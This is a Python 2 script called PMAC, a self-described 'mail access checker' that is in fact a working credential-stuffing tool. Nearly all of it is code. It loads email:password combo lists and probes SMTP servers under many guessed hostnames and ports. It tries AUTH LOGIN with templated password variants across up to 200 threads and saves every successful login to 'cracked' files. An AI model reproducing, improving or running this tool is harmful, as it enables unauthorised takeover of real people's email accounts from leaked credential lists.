# encoding: utf-8
import socket,threading,base64,datetime,sys,ssl,imaplib,time,re,os,sys,requests
# Its PMAC = Python MailAcess Checker
# {Escanor} <+> {ARON-TN}
# if you face some problem with modules run this command
# $ pip2 install requests colorama
# Or (windows):
# $ c:\Python27\Scripts\pip2.exe install requests colorama
try:
	import Queue
except:
	try:
	 import queue as Queue
	except:pass

update_pmac="EskanorSama0x6"
try:
    zz=requests.get('https://raw.githubusercontent.com/0xtn/pmac/master/pmac.py')
    if update_pmac not in zz.text.encode('utf-8'):
      print "[ Notification ! ] New Version Of Python MailAcess Checker \nDo You Want To Get Update RightNow ?? (Y/n)\033[00m"
      tfq=raw_input("pmac > ")
      if tfq.upper() in ['Y','YES']:
       sys.exit("\033[91mlink ~> https://github.com/0xtn/pmac\033[00m");os.remove(sys.arvg[0])
      else:
        pass
except:
      pass

to_check={}
from colorama import *
try:
 init()
except:
	pass
print '\033[1m'
if os.name=='nt':
   try:
	os.system('cls && title PMAC : Python MailAcess Checker [By Escan0rSama and Aron-TN] ')
   except:pass
else:
	os.system('clear')
class IMAP4_SSL(imaplib.IMAP4_SSL):
    def __init__(self, host='', port=imaplib.IMAP4_SSL_PORT, keyfile=None, 
                 certfile=None, ssl_version=None, ca_certs=None, 
                 ssl_ciphers=None,timeout=40):
       self.ssl_version = ssl_version
       self.ca_certs = ca_certs
       self.ssl_ciphers = ssl_ciphers
       self.timeout=timeout
       imaplib.IMAP4_SSL.__init__(self, host, port, keyfile, certfile) 
    def open(self, host='', port=imaplib.IMAP4_SSL_PORT):
       self.host = host
       self.port = port
       self.sock = socket.create_connection((host, port),self.timeout)
       extra_args = {}
       if self.ssl_version:
           extra_args['ssl_version'] = self.ssl_version
       if self.ca_certs:
           extra_args['cert_reqs'] = ssl.CERT_REQUIRED
           extra_args['ca_certs'] = self.ca_certs
       if self.ssl_ciphers:
           extra_args['ciphers'] = self.ssl_ciphers
  
       self.sslobj = ssl.wrap_socket(self.sock, self.keyfile, self.certfile, 
                                     **extra_args)
       self.file = self.sslobj.makefile('rb')		
class consumer(threading.Thread):
	def __init__(self,qu):
		threading.Thread.__init__(self)
		self.q=qu
		self.hosts=["","smtp.","mail.","webmail.","secure.","plus.smtp.","smtp.mail.","smtp.att.","pop3.","securesmtp.","outgoing.","smtp-mail.","plus.smtp.mail.","Smtpauths.","Smtpauth."]
		self.ports=[587,465,25]
		self.timeout=13
	def sendCmd(self,sock,cmd):
		sock.send(cmd+"\r\n")
		return sock.recv(900000)
	def addBad(self,ip):
		global bads,rbads
		if rbads:
			open('bads.txt','a').write(ip+'\n')
			bads.append(ip)
		return -1
	def findHost(self,host):
		global cache,bads,rbads
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.setblocking(0)
		s.settimeout(self.timeout)
		try:
			d=cache[host]
			try:
				if self.ports[d[1]]==465:
					s=ssl.wrap_socket(s)
				s.connect((self.hosts[d[0]]+host,self.ports[d[1]]))
				return s
			except Exception,e:
				if rbads:
					bads.append(host)
					open('bads.txt','a').write(host+'\n')
				return None
		except KeyError:
			pass
		cache[host]=[-1,-1]
		for i,p in enumerate(self.ports):
			for j,h in enumerate(self.hosts):
				try:
					s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
					s.setblocking(0)
					s.settimeout(self.timeout)
					if p==465:
						s=ssl.wrap_socket(s)
					s.connect((h+host,p))
					cache[host]=[j,i]
					return s
				except Exception,e:					
					continue
		bads.append(host)
		del cache[host]
		open('bads.txt','a').write(host+'\n')
		return None
	def getPass(self,passw,user,domain):
		passw=str(passw)
		if '%null%' in passw:
			return ""
		elif '%user%' in passw:
			user=user.replace('-','').replace('.','').replace('_','')
			return passw.replace('%user%',user)
		elif '%User%' in user:
			user=user.replace('-','').replace('.','').replace('_','')
			return passw.replace('%User%',user)
		elif '%special%' in user:
			user=user.replace('-','').replace('.','').replace('_','').replace('e','3').replace('i','1').replace('a','@')
			return passw.replace('%special%',user)
		elif '%domain%' in passw:
			return passw.replace('%domain%',domain.replace("-",""))
		if '%part' in passw:
			if '-' in user:
				parts=user.split('-')
			elif '.' in user:
				parts=user.split('.')
			elif '_' in user:
				parts=user.split('_')
			print parts				
			try:
				h=passw.replace('%part','').split('%')[0]
				i=int(h)
				p=passw.replace('%part'+str(i)+'%',parts[i-1])
				return p
			except Exception,e:
				return None
		return passw
	def connect(self,tupple,ssl=False):
		global bads,cracked,cache
		host=tupple[0].rstrip()
		host1=host
		user=tupple[1].rstrip()
		if host1 in cracked or host1 in bads:
			return 0
		passw=self.getPass(tupple[2].rstrip(),user.rstrip().split('@')[0],host.rstrip().split('.')[0])
		if passw==None:
			return 0
		try:
			if cache[host][0]==-1:
				return 0
		except KeyError:
			pass
		s=self.findHost(host)
		if s==None:
			return -1
		port=str(self.ports[cache[host][1]])
		if port=="465":
			port+="(SSL)"
		host=self.hosts[cache[host][0]]+host
		print "\033[94m[\033[92m*\033[94m]\033[92m Combo \033[00m"+user+":"+passw
		try:	
			banner=s.recv(1024)
			if banner[0:3]!="220":
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)
			rez=self.sendCmd(s,"EHLO ADMIN")
			rez=self.sendCmd(s,"AUTH LOGIN")
			if rez[0:3]!='334':
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)
			rez=self.sendCmd(s,base64.b64encode(user))
			if rez[0:3]!='334':
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)			
			rez=self.sendCmd(s,base64.b64encode(passw))
			if rez[0:3]!="235" or 'fail' in rez:
				self.sendCmd(s,'QUIT')
				s.close()
				return 0
			print "\033[94m[\033[92m!\033[94m]\033[93m Acess Done !! \033[00m"+host+'|'+port+'|'+user+'|'+passw
			open('combo_cracked.txt','a').write(user+":"+passw+"\n")
			open('rzlt_cracked.txt','a').write(("*"*21)+"\n- MailAcess Checked By Escanor - \n [Host]:"+host+"\n [Port]:"+port+"\n [User]:"+user+"\n [Password]:"+passw+"\n%s\n"%(("*"*21)))
			cracked.append(host1)
			s.close()
		except Exception,e:
			s.close()
			return self.addBad(host1)
	def run(self):
		while True:
			cmb=self.q.get()
			self.connect(cmb)
			self.q.task_done()
quee=Queue.Queue(maxsize=20000)
cache={}
llencom=0
bads=[]
cracked=[]
rbads=0 
try:
 inputs=open(sys.argv[1],'r').read().splitlines()
 thret=sys.argv[2]
 if int(thret)>200:
	thret=200
except:
 try:
 	inputs=open(raw_input('\033[94m[\033[92mCombo\033[94m]\033[00m '),'r').read().splitlines();llencom=len(inputs)
 except:
 	exit("Error !! ")
 try:
  thret=raw_input('\033[94m[\033[92mThreads(Max:200)\033[94m] \033[00m') #changing This Logo Make You Like A a Dankey's Pussy
 except:
 	exit("Error !! ")
 if int(thret)>200:
	thret=200
print """ \033[1m                                  
                                         
\033[94m?88,.d88b,\033[92m  88bd8b,d88b  §d888b8b  \033[94m d8888b
\033[94m`?88'  ?88\033[92m  88P'`?8P'?8bd8P' ?88  \033[94md8P' `P
\033[94m  88b  d8P\033[92m d88  d88  88P88b  ,88b \033[94m88b    
\033[94m  888888P'\033[92md88' d88'  88b`?88P'`88b\033[94m`?888P'
\033[94m  88P'                                   
\033[94m d88
 \033[90m+\033[91m------------------------------------\033[90m+
 \033[94m Tool     \033[92m : \033[94m Python MailAcess Checker 
 \033[94m Developer\033[92m : \033[94m mekanık_mech 
 \033[94m Version  \033[92m : \033[94m PMAC - v1.1 (bug fixed!) 
 \033[94m Combo    \033[92m : \033[94m %s
 \033[94m Facebook \033[92m : \033[94m mech.sec
 \033[94m Email    \033[92m : \033[94m specialbot[at]gmail.com                       
 \033[90m+\033[91m------------------------------------\033[90m+
"""%(llencom)

init()
print '\033[1m'
for i in "/!\ loading...":
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.2)
print "\033[00m"
for i in range(int(thret)):
	try:
		t=consumer(quee)
		t.setDaemon(True)
		t.start()
	except:
		print "\033[91m{!} Working only with %s threads\033[00m"%i
		break
#For you Merlin 
for i in inputs:
	if '@' not in i :
		pass
	if '(SSL)' in i:
			i=i.replace('(SSL)','')
	try:#we accept all formats from last versions + combos
		quee.put((i.split('|')[2].split('@')[1], i.split('|')[2], i.split('|')[3]))
	except:
	 try:
	 	quee.put((i.split(',')[2].split('@')[1], i.split(',')[2], i.split(',')[3]))
	 except:
		try:
				user = i.split(':')[0]
				password = i.split(':')[1]
				user = user.lower()
				quee.put((user.split('@')[1], user, password))
		except:pass
quee.join()
